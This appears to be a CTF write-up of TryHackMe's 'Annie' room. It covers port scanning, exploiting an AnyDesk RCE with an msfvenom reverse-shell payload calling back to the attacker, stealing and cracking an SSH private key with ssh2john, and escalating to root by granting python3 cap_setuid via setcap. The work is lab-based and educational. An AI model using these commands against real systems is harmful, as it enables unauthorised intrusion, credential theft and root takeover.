https://tryhackme.com/room/annie

  ![image](https://user-images.githubusercontent.com/87700008/205995673-6be11335-a570-4cf0-9b72-a8829cf14cff.png)

#### Difficulty : Medium

## **Initital Recon**:

Started with the quick rustscan, found 3 open ports :

    sudo rustscan -a 10.10.30.155 -- -sC -sV -T4 -vv -oN Annie_nmap
    Open 10.10.30.155:22
    Open 10.10.30.155:7070
    Open 10.10.30.155:33017
![image](https://user-images.githubusercontent.com/87700008/205996318-4065c13e-0675-48ef-85c8-c074b4befe3f.png)
![image](https://user-images.githubusercontent.com/87700008/205996442-54c654cf-20ec-488a-a3ba-215633d23693.png)

At the scan results I observed that there is AnyDesk client running on port **7070**. By looking at this I got some hint that tthis might be the point of initial access.

#### **Exploitation:**

I quckly searched for google with the AnyDesk 7070 exploit & got the results :
![image](https://user-images.githubusercontent.com/87700008/205997368-4f027e59-6d5b-42d1-841a-2b37990482e7.png)

Since, I don't have any version info I went with the first search result provied by exploit DB for version 5.5.2, ref : https://www.exploit-db.com/exploits/49613

This gave us the python exploit with Remote code execution : 
![image](https://user-images.githubusercontent.com/87700008/205998084-230664ca-cab9-4e28-b917-25c89e30c33b.png)

As per the exploit, we have to create our own shell code with msfvenom, so I created my own:

    msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
    
![image](https://user-images.githubusercontent.com/87700008/205999004-79da675d-5d3f-497d-a37f-943f488e95ff.png)

After many trial & error after many port lport change & many room reset, I finally received my connection on port 7070, on which AnyDesk is running.

![image](https://user-images.githubusercontent.com/87700008/207115160-8c796a68-db9d-4ded-9dd4-9b2e282a9bf8.png)

I received the connection as user "Annie":(pwn3d!🙂)
![image](https://user-images.githubusercontent.com/87700008/207115401-b8c97a4a-562b-4eab-bd57-902764e41393.png)

Now, it's time to upgrade & stablize the shell:

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    stty raw -echo; fg (and press enter)

![image](https://user-images.githubusercontent.com/87700008/207116033-69dc62fb-4ff1-473b-866a-4c10ae6dc89c.png)

##### **User.txt**:

And, I got user flag into the home directory of the Annie itself.
![image](https://user-images.githubusercontent.com/87700008/207116581-e5d7d03c-4311-4300-91a4-30791fca00b0.png)

In the Annie's folder I found a folder name ".ssh" where annie's private key is saved in 'id_rsa', so I copied it to my machine & tried to SSH but failed as it's asking for passphrase.

![image](https://user-images.githubusercontent.com/87700008/207118225-6713da94-d6f1-4d46-994a-27b9c7c76c49.png)

So, I quickly used a John the ripper module "ssh2john" to convert the id_rsa file into John the ripper format & tried to crack it. And in few seconds I was able to crack it as well.
![image](https://user-images.githubusercontent.com/87700008/207118733-cd5e382a-38b9-463d-9b78-a34d61000487.png)


#### **Priv Esc:**

I started with manual enumeration, like checking sudo version, cron jobs, sudo permissions etc. But I found something unusual in SUID list that there is something called "/sbin/setcap"

    find / -perm -4000 -type f 2>/dev/null

![image](https://user-images.githubusercontent.com/87700008/207129417-22261939-7b7a-40c4-adda-8c28233965ff.png)

I quckly searched for "setcap priv esc" & landed onto this page : https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

As per the blog if have the permission of setting the capablities then we can change the capablities of python3(as expample) & get the root privleges.

![image](https://user-images.githubusercontent.com/87700008/207131042-22274936-bf6f-4397-8b5b-a254ed1dfde6.png)

So, for the Priv Esc I followed the blog & copied the python3 binary in /tmp folder:

    cp /usr/bin/python3 /tmp
    
Then changed the capablities of that python3 file:

    setcap cap_setuid+ep /tmp/python3
    
And run the Python3 to set my uid as 0 & execute bash shell:

    ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
    
This gave me the root privleges:(pwn3d!🙂)

![image](https://user-images.githubusercontent.com/87700008/207131735-9dcdb730-d448-41d3-b60c-145bdc8516b5.png)

#### **Root.txt**

After successfull execution I got the root flag in root folder.

![image](https://user-images.githubusercontent.com/87700008/207131957-673acab3-0976-4370-ab29-4973f18b2abc.png)
